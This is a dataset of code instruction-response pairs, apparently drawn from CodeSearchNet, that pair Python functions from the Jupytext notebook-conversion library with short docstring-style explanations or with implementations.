{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef validate_one_format(jupytext_format):\n    if not isinstance(jupytext_format, dict):\n        raise JupytextFormatError('Jupytext format should be a dictionary')\n\n    for key in jupytext_format:\n        if key not in _VALID_FORMAT_INFO + _VALID_FORMAT_OPTIONS:\n            raise JupytextFormatError(\"Unknown format option '{}' - should be one of '{}'\".format(\n                key, \"', '\".join(_VALID_FORMAT_OPTIONS)))\n        value = jupytext_format[key]\n        if key in _BINARY_FORMAT_OPTIONS:\n            if not isinstance(value, bool):\n                raise JupytextFormatError(\"Format option '{}' should be a bool, not '{}'\".format(key, str(value)))\n\n    if 'extension' not in jupytext_format:\n        raise JupytextFormatError('Missing format extension')\n    ext = jupytext_format['extension']\n    if ext not in NOTEBOOK_EXTENSIONS + ['.auto']:\n        raise JupytextFormatError(\"Extension '{}' is not a notebook extension. Please use one of '{}'.\".format(\n            ext, \"', '\".join(NOTEBOOK_EXTENSIONS + ['.auto'])))\n\n    return jupytext_format", "response": "Validate that the given format is valid."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef black_invariant(text, chars=None):\n    if chars is None:\n        chars = [' ', '\\t', '\\n', ',', \"'\", '\"', '(', ')', '\\\\']\n\n    for char in chars:\n        text = text.replace(char, '')\n    return text", "response": "Remove characters that may be changed when reformatting the text with black"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncombine outputs of the second notebook into the first notebook.", "response": "def combine_inputs_with_outputs(nb_source, nb_outputs, fmt=None):\n    \"\"\"Copy outputs of the second notebook into\n    the first one, for cells that have matching inputs\"\"\"\n\n    output_code_cells = [cell for cell in nb_outputs.cells if cell.cell_type == 'code']\n    output_other_cells = [cell for cell in nb_outputs.cells if cell.cell_type != 'code']\n\n    fmt = long_form_one_format(fmt)\n    text_repr = nb_source.metadata.get('jupytext', {}).get('text_representation', {})\n    ext = fmt.get('extension') or text_repr.get('extension')\n    format_name = fmt.get('format_name') or text_repr.get('format_name')\n\n    nb_outputs_filtered_metadata = copy(nb_outputs.metadata)\n    filter_metadata(nb_outputs_filtered_metadata,\n                    nb_source.metadata.get('jupytext', {}).get('notebook_metadata_filter'),\n                    _DEFAULT_NOTEBOOK_METADATA)\n\n    for key in nb_outputs.metadata:\n        if key not in nb_outputs_filtered_metadata:\n            nb_source.metadata[key] = nb_outputs.metadata[key]\n\n    source_is_md_version_one = ext in ['.md', '.Rmd'] and text_repr.get('format_version') == '1.0'\n    if nb_source.metadata.get('jupytext', {}).get('formats') or ext in ['.md', '.Rmd']:\n        nb_source.metadata.get('jupytext', {}).pop('text_representation', None)\n\n    if not nb_source.metadata.get('jupytext', {}):\n        nb_source.metadata.pop('jupytext', {})\n\n    for cell in nb_source.cells:\n        # Remove outputs to warranty that trust of returned notebook is that of second notebook\n        if cell.cell_type == 'code':\n            cell.execution_count = None\n            cell.outputs = []\n\n            for i, ocell in enumerate(output_code_cells):\n                if same_content(cell.source, ocell.source):\n                    # Fill outputs with that of second notebook\n                    cell.execution_count = ocell.execution_count\n                    cell.outputs = ocell.outputs\n\n                    # Append cell metadata that was filtered\n                    if format_name in ['bare', 'sphinx'] or source_is_md_version_one:\n                        ocell_filtered_metadata = {}\n                    else:\n                        ocell_filtered_metadata = copy(ocell.metadata)\n                        filter_metadata(ocell_filtered_metadata,\n                                        nb_source.metadata.get('jupytext', {}).get('cell_metadata_filter'),\n                                        _IGNORE_CELL_METADATA)\n\n                    for key in ocell.metadata:\n                        if key not in ocell_filtered_metadata and key not in _JUPYTEXT_CELL_METADATA:\n                            cell.metadata[key] = ocell.metadata[key]\n\n                    output_code_cells = output_code_cells[(i + 1):]\n                    break\n        else:\n            for i, ocell in enumerate(output_other_cells):\n                if cell.cell_type == ocell.cell_type and same_content(cell.source, ocell.source):\n                    if format_name in ['spin', 'bare', 'sphinx'] or source_is_md_version_one:\n                        ocell_filtered_metadata = {}\n                    else:\n                        ocell_filtered_metadata = copy(ocell.metadata)\n                        filter_metadata(ocell_filtered_metadata,\n                                        nb_source.metadata.get('jupytext', {}).get('cell_metadata_filter'),\n                                        _IGNORE_CELL_METADATA)\n\n                    for key in ocell.metadata:\n                        if key not in ocell_filtered_metadata:\n                            cell.metadata[key] = ocell.metadata[key]\n\n                    output_other_cells = output_other_cells[(i + 1):]\n                    break\n\n    return nb_source"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the kernel specification for the first kernel with a matching language", "response": "def kernelspec_from_language(language):\n    \"\"\"Return the kernel specification for the first kernel with a matching language\"\"\"\n    try:\n        for name in find_kernel_specs():\n            kernel_specs = get_kernel_spec(name)\n            if kernel_specs.language == language or (language == 'c++' and kernel_specs.language.startswith('C++')):\n                return {'name': name, 'language': language, 'display_name': kernel_specs.display_name}\n    except (KeyError, ValueError):\n        pass\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the preferred format for the given extension", "response": "def preferred_format(incomplete_format, preferred_formats):\n    \"\"\"Return the preferred format for the given extension\"\"\"\n    incomplete_format = long_form_one_format(incomplete_format)\n    if 'format_name' in incomplete_format:\n        return incomplete_format\n\n    for fmt in long_form_multiple_formats(preferred_formats):\n        if ((incomplete_format['extension'] == fmt['extension'] or (\n                fmt['extension'] == '.auto' and\n                incomplete_format['extension'] not in ['.md', '.Rmd', '.ipynb'])) and\n                incomplete_format.get('suffix') == fmt.get('suffix', incomplete_format.get('suffix')) and\n                incomplete_format.get('prefix') == fmt.get('prefix', incomplete_format.get('prefix'))):\n            fmt.update(incomplete_format)\n            return fmt\n\n    return incomplete_format"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nremoves the current notebook from the list of paired notebooks", "response": "def drop_paired_notebook(self, path):\n        \"\"\"Remove the current notebook from the list of paired notebooks\"\"\"\n        if path not in self.paired_notebooks:\n            return\n\n        fmt, formats = self.paired_notebooks.pop(path)\n        prev_paired_paths = paired_paths(path, fmt, formats)\n        for alt_path, _ in prev_paired_paths:\n            if alt_path in self.paired_notebooks:\n                self.drop_paired_notebook(alt_path)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef update_paired_notebooks(self, path, fmt, formats):\n        if not formats:\n            self.drop_paired_notebook(path)\n            return\n\n        new_paired_paths = paired_paths(path, fmt, formats)\n        for alt_path, _ in new_paired_paths:\n            self.drop_paired_notebook(alt_path)\n\n        long_formats = long_form_multiple_formats(formats)\n        if len(long_formats) == 1 and set(long_formats[0]) <= {'extension'}:\n            return\n\n        short_formats = short_form_multiple_formats(formats)\n        for alt_path, alt_fmt in new_paired_paths:\n            self.paired_notebooks[alt_path] = short_form_one_format(alt_fmt), short_formats", "response": "Update the list of paired notebooks to include or update the current pair"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef set_default_format_options(self, format_options, read=False):\n        if self.default_notebook_metadata_filter:\n            format_options.setdefault('notebook_metadata_filter', self.default_notebook_metadata_filter)\n        if self.default_cell_metadata_filter:\n            format_options.setdefault('cell_metadata_filter', self.default_cell_metadata_filter)\n        if self.comment_magics is not None:\n            format_options.setdefault('comment_magics', self.comment_magics)\n        if self.split_at_heading:\n            format_options.setdefault('split_at_heading', self.split_at_heading)\n        if not read and self.default_cell_markers:\n            format_options.setdefault('cell_markers', self.default_cell_markers)\n        if read and self.sphinx_convert_rst2md:\n            format_options.setdefault('rst2md', self.sphinx_convert_rst2md)", "response": "Set default format option"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the default formats for the current path.", "response": "def default_formats(self, path):\n        \"\"\"Return the default formats, if they apply to the current path #157\"\"\"\n        formats = long_form_multiple_formats(self.default_jupytext_formats)\n        for fmt in formats:\n            try:\n                base_path(path, fmt)\n                return self.default_jupytext_formats\n            except InconsistentPath:\n                continue\n\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create_prefix_dir(self, path, fmt):\n        create_prefix_dir(self._get_os_path(path.strip('/')), fmt)", "response": "Create the prefix dir if missing"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsaves the file model and return the model with no content.", "response": "def save(self, model, path=''):\n        \"\"\"Save the file model and return the model with no content.\"\"\"\n        if model['type'] != 'notebook':\n            return super(TextFileContentsManager, self).save(model, path)\n\n        nbk = model['content']\n        try:\n            metadata = nbk.get('metadata')\n            rearrange_jupytext_metadata(metadata)\n            jupytext_metadata = metadata.setdefault('jupytext', {})\n            jupytext_formats = jupytext_metadata.get('formats') or self.default_formats(path)\n\n            if not jupytext_formats:\n                text_representation = jupytext_metadata.get('text_representation', {})\n                ext = os.path.splitext(path)[1]\n                fmt = {'extension': ext}\n\n                if ext == text_representation.get('extension') and text_representation.get('format_name'):\n                    fmt['format_name'] = text_representation.get('format_name')\n\n                jupytext_formats = [fmt]\n\n            jupytext_formats = long_form_multiple_formats(jupytext_formats, metadata)\n\n            # Set preferred formats if not format name is given yet\n            jupytext_formats = [preferred_format(fmt, self.preferred_jupytext_formats_save) for fmt in jupytext_formats]\n\n            base, fmt = find_base_path_and_format(path, jupytext_formats)\n            self.update_paired_notebooks(path, fmt, jupytext_formats)\n            self.set_default_format_options(jupytext_metadata)\n\n            if not jupytext_metadata:\n                metadata.pop('jupytext')\n\n            # Save as ipynb first\n            return_value = None\n            value = None\n            for fmt in jupytext_formats[::-1]:\n                if fmt['extension'] != '.ipynb':\n                    continue\n\n                alt_path = full_path(base, fmt)\n                self.create_prefix_dir(alt_path, fmt)\n                self.log.info(\"Saving %s\", os.path.basename(alt_path))\n                value = super(TextFileContentsManager, self).save(model, alt_path)\n                if alt_path == path:\n                    return_value = value\n\n            # And then to the other formats, in reverse order so that\n            # the first format is the most recent\n            for fmt in jupytext_formats[::-1]:\n                if fmt['extension'] == '.ipynb':\n                    continue\n\n                alt_path = full_path(base, fmt)\n                self.create_prefix_dir(alt_path, fmt)\n                if 'format_name' in fmt and fmt['extension'] not in ['.Rmd', '.md']:\n                    self.log.info(\"Saving %s in format %s:%s\",\n                                  os.path.basename(alt_path), fmt['extension'][1:], fmt['format_name'])\n                else:\n                    self.log.info(\"Saving %s\", os.path.basename(alt_path))\n                with mock.patch('nbformat.writes', _jupytext_writes(fmt)):\n                    value = super(TextFileContentsManager, self).save(model, alt_path)\n                    if alt_path == path:\n                        return_value = value\n\n            # Update modified timestamp to match that of the pair #207\n            return_value['last_modified'] = value['last_modified']\n            return return_value\n\n        except Exception as err:\n            raise HTTPError(400, str(err))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get(self, path, content=True, type=None, format=None, load_alternative_format=True):\n        path = path.strip('/')\n        ext = os.path.splitext(path)[1]\n\n        # Not a notebook?\n        if not self.exists(path) or (type != 'notebook' if type else ext not in self.all_nb_extensions()):\n            return super(TextFileContentsManager, self).get(path, content, type, format)\n\n        fmt = preferred_format(ext, self.preferred_jupytext_formats_read)\n        if ext == '.ipynb':\n            model = self._notebook_model(path, content=content)\n        else:\n            self.set_default_format_options(fmt, read=True)\n            with mock.patch('nbformat.reads', _jupytext_reads(fmt)):\n                model = self._notebook_model(path, content=content)\n\n        if not load_alternative_format:\n            return model\n\n        if not content:\n            # Modification time of a paired notebook, in this context - Jupyter is checking timestamp\n            # before saving - is the most recent among all representations #118\n            if path not in self.paired_notebooks:\n                return model\n\n            fmt, formats = self.paired_notebooks.get(path)\n            for alt_path, _ in paired_paths(path, fmt, formats):\n                if alt_path != path and self.exists(alt_path):\n                    alt_model = self._notebook_model(alt_path, content=False)\n                    if alt_model['last_modified'] > model['last_modified']:\n                        model['last_modified'] = alt_model['last_modified']\n\n            return model\n\n        # We will now read a second file if this is a paired notebooks.\n        nbk = model['content']\n        jupytext_formats = nbk.metadata.get('jupytext', {}).get('formats') or self.default_formats(path)\n        jupytext_formats = long_form_multiple_formats(jupytext_formats)\n\n        # Compute paired notebooks from formats\n        alt_paths = [(path, fmt)]\n        if jupytext_formats:\n            try:\n                _, fmt = find_base_path_and_format(path, jupytext_formats)\n                alt_paths = paired_paths(path, fmt, jupytext_formats)\n                self.update_paired_notebooks(path, fmt, jupytext_formats)\n            except InconsistentPath as err:\n                self.log.info(\"Unable to read paired notebook: %s\", str(err))\n        else:\n            if path in self.paired_notebooks:\n                fmt, formats = self.paired_notebooks.get(path)\n                alt_paths = paired_paths(path, fmt, formats)\n\n        if len(alt_paths) > 1 and ext == '.ipynb':\n            # Apply default options (like saving and reloading would do)\n            jupytext_metadata = model['content']['metadata'].get('jupytext', {})\n            self.set_default_format_options(jupytext_metadata, read=True)\n            if jupytext_metadata:\n                model['content']['metadata']['jupytext'] = jupytext_metadata\n\n        org_model = model\n        fmt_inputs = fmt\n        path_inputs = path_outputs = path\n        model_outputs = None\n\n        # Source format is first non ipynb format found on disk\n        if path.endswith('.ipynb'):\n            for alt_path, alt_fmt in alt_paths:\n                if not alt_path.endswith('.ipynb') and self.exists(alt_path):\n                    self.log.info(u'Reading SOURCE from {}'.format(alt_path))\n                    path_inputs = alt_path\n                    fmt_inputs = alt_fmt\n                    model_outputs = model\n                    model = self.get(alt_path, content=content, type=type, format=format,\n                                     load_alternative_format=False)\n                    break\n        # Outputs taken from ipynb if in group, if file exists\n        else:\n            for alt_path, _ in alt_paths:\n                if alt_path.endswith('.ipynb') and self.exists(alt_path):\n                    self.log.info(u'Reading OUTPUTS from {}'.format(alt_path))\n                    path_outputs = alt_path\n                    model_outputs = self.get(alt_path, content=content, type=type, format=format,\n                                             load_alternative_format=False)\n                    break\n\n        try:\n            check_file_version(model['content'], path_inputs, path_outputs)\n        except Exception as err:\n            raise HTTPError(400, str(err))\n\n        # Before we combine the two files, we make sure we're not overwriting ipynb cells\n        # with an outdated text file\n        try:\n            if model_outputs and model_outputs['last_modified'] > model['last_modified'] + \\\n                    timedelta(seconds=self.outdated_text_notebook_margin):\n                raise HTTPError(\n                    400,\n                    '''{out} (last modified {out_last})\n                    seems more recent than {src} (last modified {src_last})\n                    Please either:\n                    - open {src} in a text editor, make sure it is up to date, and save it,\n                    - or delete {src} if not up to date,\n                    - or increase check margin by adding, say,\n                        c.ContentsManager.outdated_text_notebook_margin = 5 # in seconds # or float(\"inf\")\n                    to your .jupyter/jupyter_notebook_config.py file\n                    '''.format(src=path_inputs, src_last=model['last_modified'],\n                               out=path_outputs, out_last=model_outputs['last_modified']))\n        except OverflowError:\n            pass\n\n        if model_outputs:\n            combine_inputs_with_outputs(model['content'], model_outputs['content'], fmt_inputs)\n        elif not path.endswith('.ipynb'):\n            nbk = model['content']\n            language = nbk.metadata.get('jupytext', {}).get('main_language', 'python')\n            if 'kernelspec' not in nbk.metadata and language != 'python':\n                kernelspec = kernelspec_from_language(language)\n                if kernelspec:\n                    nbk.metadata['kernelspec'] = kernelspec\n\n        # Trust code cells when they have no output\n        for cell in model['content'].cells:\n            if cell.cell_type == 'code' and not cell.outputs and cell.metadata.get('trusted') is False:\n                cell.metadata['trusted'] = True\n\n        # Path and name of the notebook is the one of the original path\n        model['path'] = org_model['path']\n        model['name'] = org_model['name']\n\n        return model", "response": "Returns a specific notebook or file."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef trust_notebook(self, path):\n        if path.endswith('.ipynb') or path not in self.paired_notebooks:\n            super(TextFileContentsManager, self).trust_notebook(path)\n            return\n\n        fmt, formats = self.paired_notebooks[path]\n        for alt_path, alt_fmt in paired_paths(path, fmt, formats):\n            if alt_fmt['extension'] == '.ipynb':\n                super(TextFileContentsManager, self).trust_notebook(alt_path)", "response": "Trust the current notebook"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef rename_file(self, old_path, new_path):\n        if old_path not in self.paired_notebooks:\n            try:\n                # we do not know yet if this is a paired notebook (#190)\n                # -> to get this information we open the notebook\n                self.get(old_path, content=True)\n            except Exception:\n                pass\n\n        if old_path not in self.paired_notebooks:\n            super(TextFileContentsManager, self).rename_file(old_path, new_path)\n            return\n\n        fmt, formats = self.paired_notebooks.get(old_path)\n        old_alt_paths = paired_paths(old_path, fmt, formats)\n\n        # Is the new file name consistent with suffix?\n        try:\n            new_base = base_path(new_path, fmt)\n        except Exception as err:\n            raise HTTPError(400, str(err))\n\n        for old_alt_path, alt_fmt in old_alt_paths:\n            new_alt_path = full_path(new_base, alt_fmt)\n            if self.exists(old_alt_path):\n                super(TextFileContentsManager, self).rename_file(old_alt_path, new_alt_path)\n\n        self.drop_paired_notebook(old_path)\n        self.update_paired_notebooks(new_path, fmt, formats)", "response": "Rename the current notebook as well as its alternative representations."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nis the first non - empty line of the cell either a function or a class?", "response": "def next_instruction_is_function_or_class(lines):\n    \"\"\"Is the first non-empty, non-commented line of the cell either a function or a class?\"\"\"\n    for i, line in enumerate(lines):\n        if not line.strip():  # empty line\n            if i > 0 and not lines[i - 1].strip():\n                return False\n            continue\n        if line.startswith('def ') or line.startswith('class '):\n            return True\n        if line.startswith(('#', '@', ' ')):\n            continue\n        return False\n\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndo the last line of the cell belong to an indented code?", "response": "def cell_ends_with_function_or_class(lines):\n    \"\"\"Does the last line of the cell belong to an indented code?\"\"\"\n    non_quoted_lines = []\n    parser = StringParser('python')\n    for line in lines:\n        if not parser.is_quoted():\n            non_quoted_lines.append(line)\n        parser.read_line(line)\n\n    # find the first line, starting from the bottom, that is not indented\n    lines = non_quoted_lines[::-1]\n    for i, line in enumerate(lines):\n        if not line.strip():\n            # two blank lines? we won't need to insert more blank lines below this cell\n            if i > 0 and not lines[i - 1].strip():\n                return False\n            continue\n        if line.startswith('#') or line.startswith(' '):\n            continue\n        if line.startswith('def ') or line.startswith('class '):\n            return True\n        return False\n\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef cell_ends_with_code(lines):\n    if not lines:\n        return False\n    if not lines[-1].strip():\n        return False\n    if lines[-1].startswith('#'):\n        return False\n    return True", "response": "Is the last line of the cell a line with code?"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef cell_has_code(lines):\n    for i, line in enumerate(lines):\n        stripped_line = line.strip()\n        if stripped_line.startswith('#'):\n            continue\n\n        # Two consecutive blank lines?\n        if not stripped_line:\n            if i > 0 and not lines[i - 1].strip():\n                return False\n            continue\n\n        return True\n\n    return False", "response": "Is there any code in this cell?"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef pep8_lines_between_cells(prev_lines, next_lines, ext):\n    if not next_lines:\n        return 1\n    if not prev_lines:\n        return 0\n    if ext != '.py':\n        return 1\n    if cell_ends_with_function_or_class(prev_lines):\n        return 2 if cell_has_code(next_lines) else 1\n    if cell_ends_with_code(prev_lines) and next_instruction_is_function_or_class(next_lines):\n        return 2\n    return 1", "response": "How many blank lines should be added between two python paragraphs?"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a filtered version of the given cell.", "response": "def filtered_cell(cell, preserve_outputs, cell_metadata_filter):\n    \"\"\"Cell type, metadata and source from given cell\"\"\"\n    metadata = copy(cell.metadata)\n    filter_metadata(metadata, cell_metadata_filter, _IGNORE_CELL_METADATA)\n\n    filtered = {'cell_type': cell.cell_type,\n                'source': cell.source,\n                'metadata': metadata}\n\n    if preserve_outputs:\n        for key in ['execution_count', 'outputs']:\n            if key in cell:\n                filtered[key] = cell[key]\n\n    return filtered"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef filtered_notebook_metadata(notebook):\n    metadata = copy(notebook.metadata)\n    metadata = filter_metadata(metadata,\n                               notebook.metadata.get('jupytext', {}).get('notebook_metadata_filter'),\n                               _DEFAULT_NOTEBOOK_METADATA)\n    if 'jupytext' in metadata:\n        del metadata['jupytext']\n    return metadata", "response": "Notebook metadata filtered for metadata added by Jupytext itself"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef same_content(ref_source, test_source, allow_removed_final_blank_line):\n    if ref_source == test_source:\n        return True\n\n    if not allow_removed_final_blank_line:\n        return False\n\n    # Is ref identical to test, plus one blank line?\n    ref_source = ref_source.splitlines()\n    test_source = test_source.splitlines()\n\n    if not ref_source:\n        return False\n\n    if ref_source[:-1] != test_source:\n        return False\n\n    return _BLANK_LINE.match(ref_source[-1])", "response": "Returns True if the content of two cells are the same."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncompare two notebooks and raise a meaningful message if they differ.", "response": "def compare_notebooks(notebook_expected,\n                      notebook_actual,\n                      fmt=None,\n                      allow_expected_differences=True,\n                      raise_on_first_difference=True,\n                      compare_outputs=False):\n    \"\"\"Compare the two notebooks, and raise with a meaningful message\n    that explains the differences, if any\"\"\"\n    fmt = long_form_one_format(fmt)\n    format_name = fmt.get('format_name')\n\n    # Expected differences\n    allow_filtered_cell_metadata = allow_expected_differences\n    allow_missing_code_cell_metadata = allow_expected_differences and format_name == 'sphinx'\n    allow_missing_markdown_cell_metadata = allow_expected_differences and format_name in ['sphinx', 'spin']\n    allow_removed_final_blank_line = allow_expected_differences\n\n    cell_metadata_filter = notebook_actual.get('jupytext', {}).get('cell_metadata_filter')\n\n    if format_name == 'sphinx' and notebook_actual.cells and notebook_actual.cells[0].source == '%matplotlib inline':\n        notebook_actual.cells = notebook_actual.cells[1:]\n\n    # Compare cells type and content\n    test_cell_iter = iter(notebook_actual.cells)\n    modified_cells = set()\n    modified_cell_metadata = set()\n    for i, ref_cell in enumerate(notebook_expected.cells, 1):\n        try:\n            test_cell = next(test_cell_iter)\n        except StopIteration:\n            if raise_on_first_difference:\n                raise NotebookDifference('No cell corresponding to {} cell #{}:\\n{}'\n                                         .format(ref_cell.cell_type, i, ref_cell.source))\n            modified_cells.update(range(i, len(notebook_expected.cells) + 1))\n            break\n\n        ref_lines = [line for line in ref_cell.source.splitlines() if not _BLANK_LINE.match(line)]\n        test_lines = []\n\n        # 1. test cell type\n        if ref_cell.cell_type != test_cell.cell_type:\n            if raise_on_first_difference:\n                raise NotebookDifference(\"Unexpected cell type '{}' for {} cell #{}:\\n{}\"\n                                         .format(test_cell.cell_type, ref_cell.cell_type, i, ref_cell.source))\n            modified_cells.add(i)\n\n        # 2. test cell metadata\n        if (ref_cell.cell_type == 'code' and not allow_missing_code_cell_metadata) or \\\n                (ref_cell.cell_type != 'code' and not allow_missing_markdown_cell_metadata):\n\n            if allow_filtered_cell_metadata:\n                ref_cell.metadata = {key: ref_cell.metadata[key] for key in ref_cell.metadata\n                                     if key not in _IGNORE_CELL_METADATA}\n                test_cell.metadata = {key: test_cell.metadata[key] for key in test_cell.metadata\n                                      if key not in _IGNORE_CELL_METADATA}\n\n            if ref_cell.metadata != test_cell.metadata:\n                if raise_on_first_difference:\n                    try:\n                        compare(ref_cell.metadata, test_cell.metadata)\n                    except AssertionError as error:\n                        raise NotebookDifference(\"Metadata differ on {} cell #{}: {}\\nCell content:\\n{}\"\n                                                 .format(test_cell.cell_type, i, str(error), ref_cell.source))\n                else:\n                    modified_cell_metadata.update(set(test_cell.metadata).difference(ref_cell.metadata))\n                    modified_cell_metadata.update(set(ref_cell.metadata).difference(test_cell.metadata))\n                    for key in set(ref_cell.metadata).intersection(test_cell.metadata):\n                        if ref_cell.metadata[key] != test_cell.metadata[key]:\n                            modified_cell_metadata.add(key)\n\n        test_lines.extend([line for line in test_cell.source.splitlines() if not _BLANK_LINE.match(line)])\n\n        # 3. test cell content\n        if ref_lines != test_lines:\n            if raise_on_first_difference:\n                try:\n                    compare('\\n'.join(ref_lines), '\\n'.join(test_lines))\n                except AssertionError as error:\n                    raise NotebookDifference(\"Cell content differ on {} cell #{}: {}\"\n                                             .format(test_cell.cell_type, i, str(error)))\n            else:\n                modified_cells.add(i)\n\n        # 3. bis test entire cell content\n        if not same_content(ref_cell.source, test_cell.source, allow_removed_final_blank_line):\n            try:\n                compare(ref_cell.source, test_cell.source)\n            except AssertionError as error:\n                if raise_on_first_difference:\n                    raise NotebookDifference(\"Cell content differ on {} cell #{}: {}\"\n                                             .format(test_cell.cell_type, i, str(error)))\n                modified_cells.add(i)\n\n        if not compare_outputs:\n            continue\n\n        if ref_cell.cell_type != 'code':\n            continue\n\n        ref_cell = filtered_cell(ref_cell,\n                                 preserve_outputs=compare_outputs,\n                                 cell_metadata_filter=cell_metadata_filter)\n        test_cell = filtered_cell(test_cell,\n                                  preserve_outputs=compare_outputs,\n                                  cell_metadata_filter=cell_metadata_filter)\n\n        try:\n            compare(ref_cell, test_cell)\n        except AssertionError as error:\n            if raise_on_first_difference:\n                raise NotebookDifference(\"Cell outputs differ on {} cell #{}: {}\"\n                                         .format(test_cell['cell_type'], i, str(error)))\n            modified_cells.add(i)\n\n    # More cells in the actual notebook?\n    remaining_cell_count = 0\n    while True:\n        try:\n            test_cell = next(test_cell_iter)\n            if raise_on_first_difference:\n                raise NotebookDifference('Additional {} cell: {}'.format(test_cell.cell_type, test_cell.source))\n            remaining_cell_count += 1\n        except StopIteration:\n            break\n\n    if remaining_cell_count and not raise_on_first_difference:\n        modified_cells.update(\n            range(len(notebook_expected.cells) + 1, len(notebook_expected.cells) + 1 + remaining_cell_count))\n\n    # Compare notebook metadata\n    modified_metadata = False\n    try:\n        compare(filtered_notebook_metadata(notebook_expected),\n                filtered_notebook_metadata(notebook_actual))\n    except AssertionError as error:\n        if raise_on_first_difference:\n            raise NotebookDifference(\"Notebook metadata differ: {}\".format(str(error)))\n        modified_metadata = True\n\n    error = []\n    if modified_cells:\n        error.append('Cells {} differ ({}/{})'.format(','.join([str(i) for i in modified_cells]),\n                                                      len(modified_cells), len(notebook_expected.cells)))\n    if modified_cell_metadata:\n        error.append(\"Cell metadata '{}' differ\".format(\"', '\".join([str(i) for i in modified_cell_metadata])))\n    if modified_metadata:\n        error.append('Notebook metadata differ')\n\n    if error:\n        raise NotebookDifference(' | '.join(error))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the source of the current cell as an array of lines", "response": "def cell_source(cell):\n    \"\"\"Return the source of the current cell, as an array of lines\"\"\"\n    source = cell.source\n    if source == '':\n        return ['']\n    if source.endswith('\\n'):\n        return source.splitlines() + ['']\n    return source.splitlines()"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef endofcell_marker(source, comment):\n    endofcell = '-'\n    while True:\n        endofcell_re = re.compile(r'^{}( )'.format(comment) + endofcell + r'\\s*$')\n        if list(filter(endofcell_re.match, source)):\n            endofcell = endofcell + '-'\n        else:\n            return endofcell", "response": "Issues #31 #38 : does the cell contain a blank line? In that case we add an end - of - cell marker."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef is_code(self):\n        if self.cell_type == 'code':\n            return True\n        if self.cell_type == 'raw' and 'active' in self.metadata:\n            return True\n        return False", "response": "Is this cell a code cell?"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef cell_to_text(self):\n        if self.is_code():\n            return self.code_to_text()\n\n        source = copy(self.source)\n        if not self.comment:\n            escape_code_start(source, self.ext, None)\n        return self.markdown_to_text(source)", "response": "Return the text representation of the cell"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef markdown_to_text(self, source):\n        if self.comment and self.comment != \"#'\":\n            source = copy(source)\n            comment_magic(source, self.language, self.comment_magics)\n\n        return comment_lines(source, self.comment)", "response": "Escape the given source for a markdown cell"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef cell_to_text(self):\n        if self.cell_type == 'markdown':\n            # Is an explicit region required?\n            if self.metadata or self.cell_reader(self.fmt).read(self.source)[1] < len(self.source):\n                if self.metadata:\n                    region_start = ['<!-- #region']\n                    if 'title' in self.metadata and '{' not in self.metadata['title']:\n                        region_start.append(self.metadata.pop('title'))\n                    region_start.append(json.dumps(self.metadata))\n                    region_start.append('-->')\n                    region_start = ' '.join(region_start)\n                else:\n                    region_start = '<!-- #region -->'\n\n                return [region_start] + self.source + ['<!-- #endregion -->']\n            return self.source\n\n        return self.code_to_text()", "response": "Return the text representation of a cell"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef code_to_text(self):\n        source = copy(self.source)\n        comment_magic(source, self.language, self.comment_magics)\n\n        options = []\n        if self.cell_type == 'code' and self.language:\n            options.append(self.language)\n\n        filtered_metadata = {key: self.metadata[key] for key in self.metadata\n                             if key not in ['active', 'language']}\n\n        if filtered_metadata:\n            options.append(metadata_to_md_options(filtered_metadata))\n\n        return ['```{}'.format(' '.join(options))] + source + ['```']", "response": "Return the text representation of a code cell"}
